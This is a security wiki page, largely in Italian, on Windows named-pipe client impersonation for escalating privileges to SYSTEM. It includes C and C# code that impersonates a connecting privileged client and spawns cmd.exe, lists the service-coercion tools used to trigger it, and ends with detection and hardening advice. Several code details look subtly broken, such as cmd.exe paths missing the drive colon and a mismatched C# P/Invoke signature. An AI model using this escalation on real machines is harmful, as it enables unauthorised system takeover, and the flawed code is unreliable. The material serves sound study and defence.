# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation è una primitiva di local privilege escalation che permette a un thread server di named-pipe di adottare il contesto di sicurezza di un client che si connette. In pratica, un attaccante che può eseguire codice con SeImpersonatePrivilege può costringere un client privilegiato (es., un servizio SYSTEM) a connettersi a una pipe controllata dall'attaccante, chiamare ImpersonateNamedPipeClient, duplicare il token risultante in un primary token e avviare un processo come il client (spesso NT AUTHORITY\SYSTEM).

Questa pagina si concentra sulla tecnica di base. Per catene di exploit end-to-end che costringono SYSTEM a connettersi alla tua pipe, vedi le pagine della Potato family referenziate più sotto.

## TL;DR
- Crea una named pipe: \\.\pipe\<random> e attendi una connessione.
- Fai in modo che un componente privilegiato si connetta (spooler/DCOM/EFSRPC/etc.).
- Leggi almeno un messaggio dalla pipe, poi chiama ImpersonateNamedPipeClient.
- Apri il token di impersonation dal thread corrente, DuplicateTokenEx(TokenPrimary), e usa CreateProcessWithTokenW/CreateProcessAsUser per ottenere un processo SYSTEM.

## Requisiti e API principali
- Privilegi tipicamente necessari al processo/thread chiamante:
- SeImpersonatePrivilege per impersonare con successo un client che si connette e per usare CreateProcessWithTokenW.
- In alternativa, dopo aver impersonato SYSTEM, puoi usare CreateProcessAsUser, che può richiedere SeAssignPrimaryTokenPrivilege e SeIncreaseQuotaPrivilege (questi sono soddisfatti quando stai impersonando SYSTEM).
- API principali usate:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (devi leggere almeno un messaggio prima dell'impersonazione)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Livello di impersonation: per eseguire azioni utili localmente, il client deve permettere SecurityImpersonation (impostazione di default per molti client RPC/named-pipe locali). I client possono abbassare questo con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION quando aprono la pipe.

## Flusso Win32 minimale (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Note:
- Se ImpersonateNamedPipeClient restituisce ERROR_CANNOT_IMPERSONATE (1368), assicurati di leggere prima dalla pipe e che il client non abbia limitato l'impersonation al livello Identification.
- Preferire DuplicateTokenEx con SecurityImpersonation e TokenPrimary per creare un token primario adatto alla creazione di processi.

## .NET esempio rapido
In .NET, NamedPipeServerStream può impersonare tramite RunAsClient. Una volta impersonando, duplica il token del thread e crea un processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Inneschi/coercizioni comuni per ottenere SYSTEM sulla tua named pipe
These techniques coerce privileged services to connect to your named pipe so you can impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Consulta l'uso dettagliato e la compatibilità qui:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Se ti serve solo un esempio completo di crafting the pipe and impersonating to spawn SYSTEM from a service trigger, vedi:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Troubleshooting and gotchas
- Devi leggere almeno un messaggio dalla pipe prima di chiamare ImpersonateNamedPipeClient; altrimenti otterrai ERROR_CANNOT_IMPERSONATE (1368).
- Se il client si connette con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, il server non può impersonare completamente; verifica il livello di impersonation del token tramite GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW richiede SeImpersonatePrivilege sul chiamante. Se fallisce con ERROR_PRIVILEGE_NOT_HELD (1314), usa CreateProcessAsUser dopo che hai già impersonato SYSTEM.
- Assicurati che il security descriptor della tua pipe permetta al servizio target di connettersi se lo hai rinforzato; per default, le pipe sotto \\.\pipe sono accessibili secondo la DACL del server.

## Detection and hardening
- Monitora la creazione e le connessioni alle named pipe. Sysmon Event IDs 17 (Pipe Created) e 18 (Pipe Connected) sono utili per creare una baseline dei nomi di pipe legittimi e catturare pipe insolite o dall'aspetto casuale che precedono eventi di token-manipulation.
- Cerca sequenze: un processo crea una pipe, un servizio SYSTEM si connette, poi il processo creatore genera un figlio come SYSTEM.
- Riduci l'esposizione rimuovendo SeImpersonatePrivilege dagli account di servizio non essenziali e evitando logon di servizio non necessari con privilegi elevati.
- Sviluppo difensivo: quando ti connetti a named pipe non attendibili, specifica SECURITY_SQOS_PRESENT con SECURITY_IDENTIFICATION per impedire ai server di impersonare completamente il client a meno che non sia necessario.

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
